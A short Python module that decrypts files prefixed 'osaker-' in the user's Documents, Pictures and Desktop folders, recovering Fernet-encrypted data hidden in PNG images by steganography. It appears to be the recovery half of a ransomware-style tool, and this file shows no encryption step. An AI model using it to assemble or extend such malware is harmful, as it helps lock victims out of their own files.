import threading

from cryptography.fernet import Fernet

from steganography import *
from utils import *


def decrypt_file(file_path, key):
    image = reveal_data(file_path)

    new_file_path = file_path.replace(".png", "")

    extracted_file_name = new_file_path.replace(".encrypted", "").replace("osaker-", "")

    fernet = Fernet(key)

    decrypted_data = fernet.decrypt(image)

    with open(new_file_path, "wb") as f:
        f.write(decrypted_data)

    extract_file(new_file_path, extracted_file_name)

    os.remove(new_file_path)
    os.remove(file_path)

    print("File decrypted successfully!")


def decrypt_in_dir(dir_path, key):
    for file in os.listdir(dir_path):
        file_path = os.path.join(dir_path, file)
        if os.path.isfile(file_path):
            if file.startswith("osaker-"):
                decrypt_file(file_path, key)
        elif os.path.isdir(file_path):
            try:
                decrypt_in_dir(file_path, key)
            except Exception:
                pass


def decrypt(key):
    directories = [DOCUMENTS, PICTURES, DESKTOP]

    threads = []
    for directory in directories:
        thread = threading.Thread(target=decrypt_in_dir, args=(directory, key))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
